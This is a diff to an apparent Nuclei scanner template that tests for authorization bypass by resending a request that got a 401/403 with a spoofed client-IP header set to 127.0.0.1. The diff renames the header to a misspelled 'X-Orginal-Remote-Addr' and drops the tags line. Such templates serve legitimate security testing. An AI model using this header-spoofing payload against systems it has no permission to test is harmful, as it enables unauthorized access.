@@ -1,10 +1,10 @@
 id: Authorization-bypass
+
 info:
   name: Custom IP Authorization Bypass
   author: MNM
   severity: medium
-  description: Checks for 401/403 responses and attempts bypass using X-Custom-IP-Authorization header
-  tags: auth,header,ip
+  description: Checks for 401/403 responses and attempts bypass using X-Orginal-Remote-Addr header
 
 flow: http(1) && http(2)
 
@@ -12,6 +12,7 @@ http:
   - method: GET
     path:
       - "{{BaseURL}}"
+    
     matchers:
       - type: status
         name: auth-required
@@ -24,7 +25,8 @@ http:
     path:
       - "{{BaseURL}}"
     headers:
-      X-Custom-IP-Authorization: "127.0.0.1"
+      X-Orginal-Remote-Addr: "127.0.0.1"
+    
     matchers:
       - type: status
         status:
@@ -33,4 +35,5 @@ http:
     extractors:
       - type: dsl
         dsl:
-          - '"X-Custom-IP-Authorization: 127.0.0.1"'
+          - '"X-Orginal-Remote-Addr: 127.0.0.1"'
+
